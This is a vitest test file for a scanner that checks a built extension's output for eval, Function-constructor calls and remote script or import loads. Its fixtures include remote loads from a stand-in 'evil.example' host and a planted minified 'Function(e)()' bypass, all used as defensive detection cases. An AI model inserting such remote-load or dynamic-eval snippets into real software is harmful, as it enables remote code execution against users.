import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { scanDistForViolations } from "./scan-dist-for-eval.mjs";

// Exercises the scanner's matching logic against small synthetic
// directories, so it is proven correct without depending on a real
// `vite build` output existing (the actual dist/ enforcement runs as
// part of `pnpm build`; see package.json and the header comment in
// scan-dist-for-eval.mjs).

let dir: string;

beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), "scan-dist-test-"));
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

function write(relativePath: string, content: string): void {
  writeFileSync(path.join(dir, relativePath), content);
}

describe("scanDistForViolations", () => {
  it("is clean on ordinary bundled JS and HTML", () => {
    write("popup.html", '<!doctype html><html><body><script type="module" src="./popup.js"></script></body></html>');
    write("popup.js", 'const evaluate = 1; console.log("hello");');
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("flags a literal eval( call", () => {
    write("worker.js", 'function run(s) { return eval(s); }');
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("eval"))).toBe(true);
  });

  it("does not flag 'eval' as a property/identifier substring (retrieval, evaluate)", () => {
    write("worker.js", "const retrieval = 1; function evaluate() {} obj.eval2(1);");
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("flags new Function(...)", () => {
    write("worker.js", 'const f = new Function("a", "return a");');
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("Function(...)"))).toBe(true);
  });

  it("flags a bare Function(...) call with no 'new' (the minified shape a real build emits)", () => {
    write("worker.js", 'const f = Function("a", "return a");');
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("Function(...)"))).toBe(true);
  });

  it("does not flag an identifier that merely ends with 'Function' (myFunction(, getFunction()", () => {
    write("worker.js", "myFunction(1); getFunction()(2); obj.doFunction();");
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("flags window.eval(...) and globalThis.eval(...) (a '.' immediately before eval must not hide a real call)", () => {
    write("worker.js", "window.eval(x);\nglobalThis.eval(y);");
    const offenses = scanDistForViolations(dir);
    expect(offenses.filter((o) => o.includes("eval")).length).toBe(2);
  });

  it("flags an aliased eval reference with no adjacent '(' at all, e.g. (0, eval)(x)", () => {
    write("worker.js", "const e = (0, eval); e(x);");
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("eval"))).toBe(true);
  });

  it("allows zod's own jitless capability probe by its exact known snippet", () => {
    write(
      "zod-jitless-abc123.js",
      'var p=r(()=>{if(Q.jitless)return!1;try{return Function(``),!0}catch{return!1}});',
    );
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("still flags a different Function(...) call elsewhere in the same file as the allowed zod snippet (the allowlist is snippet-exact, not file-wide)", () => {
    write(
      "zod-jitless-abc123.js",
      [
        'var p=r(()=>{if(Q.jitless)return!1;try{return Function(``),!0}catch{return!1}});',
        'const evil = new Function("a", "return a");',
      ].join("\n"),
    );
    const offenses = scanDistForViolations(dir);
    expect(offenses.length).toBe(1);
    expect(offenses[0]).toMatch(/:2: forbidden Function/);
  });

  // Revision 2: the built zod-jitless-*.js chunk is a single ~10 KB line, so
  // an exception that exempts the whole *line* exempts the whole chunk. The
  // reviewer's plant (`new Function(code)()` in src/shared/zod-jitless.ts)
  // minified to exactly this shape and the build still printed "scan clean".
  it("flags a real Function(...) call on the SAME line as zod's allowed probe (the reviewer's minified plant)", () => {
    write(
      "zod-jitless-abc123.js",
      'var p=r(()=>{if(Q.jitless)return!1;try{return Function(``),!0}catch{return!1}});function ce(e){return Function(e)()}',
    );
    const offenses = scanDistForViolations(dir);
    expect(offenses).toEqual(["zod-jitless-abc123.js:1: forbidden Function(...) constructor call in built output"]);
  });

  it("flags an unminified new Function(...) on the same line as zod's allowed probe", () => {
    write(
      "zod-jitless-abc123.js",
      'var p=r(()=>{try{return Function(``),!0}catch{return!1}});const run=(code)=>new Function(code)();',
    );
    expect(scanDistForViolations(dir)).toEqual([
      "zod-jitless-abc123.js:1: forbidden Function(...) constructor call in built output",
    ]);
  });

  it("allows a line whose only Function(...) calls are exact copies of zod's probe (every occurrence is removed, not just the first)", () => {
    write(
      "zod-jitless-abc123.js",
      'var p=r(()=>{try{return Function(``),!0}catch{return!1}}),q=r(()=>{try{return Function(``),!0}catch{return!1}});',
    );
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("does not let the removed probe glue its neighbours together and hide a Function(...) call right after it", () => {
    // Removing the probe with "" would leave `x$Function(e)`, which the
    // `(?<![\w$.])` lookbehind skips as a longer identifier. The scanner
    // removes it with a space instead, so the call is still seen.
    write("worker.js", "x$try{return Function(``),!0}catch{return!1}Function(e)");
    expect(scanDistForViolations(dir)).toEqual(["worker.js:1: forbidden Function(...) constructor call in built output"]);
  });

  it("flags a remote <script src> in an HTML file", () => {
    write("popup.html", '<script src="https://evil.example/payload.js"></script>');
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("remote <script"))).toBe(true);
  });

  it("does not flag a local <script src>", () => {
    write("popup.html", '<script type="module" src="./popup.js"></script>');
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("flags a remote dynamic import(\"http...\") in JS", () => {
    write("worker.js", 'async function load() { await import("https://evil.example/mod.js"); }');
    const offenses = scanDistForViolations(dir);
    expect(offenses.some((o) => o.includes("remote import"))).toBe(true);
  });

  it("does not flag a local dynamic import", () => {
    write("worker.js", 'async function load() { await import("./chunk-abc123.js"); }');
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("ignores non-js/html files entirely (e.g. woff2, png, css)", () => {
    write("theme.css", "body { color: red; }");
    expect(scanDistForViolations(dir)).toEqual([]);
  });

  it("reports file:line for each offense", () => {
    write("worker.js", "line one\nline two eval(x)\nline three");
    const offenses = scanDistForViolations(dir);
    expect(offenses[0]).toMatch(/^worker\.js:2:/);
  });
});
